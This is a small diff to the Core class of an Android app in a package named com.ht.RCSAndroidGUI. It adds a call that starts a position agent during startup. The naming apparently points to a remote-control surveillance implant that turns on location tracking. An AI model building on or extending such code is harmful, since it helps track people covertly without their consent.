@@ -15,6 +15,7 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.action.Action;
 import com.ht.RCSAndroidGUI.action.SubAction;
 import com.ht.RCSAndroidGUI.action.UninstallAction;
+import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.AgentManager;
 import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.event.EventManager;
@@ -217,6 +218,8 @@ public class Core extends Activity implements Runnable {
 				Log.d(TAG,"agentManager FAILED");
 				return false;
 			}
+			
+			agentManager.start(AgentConf.AGENT_POSITION);
 			
 			Log.d(TAG,"Info: Agents started");
 			Log.d(TAG, "Core initialized");
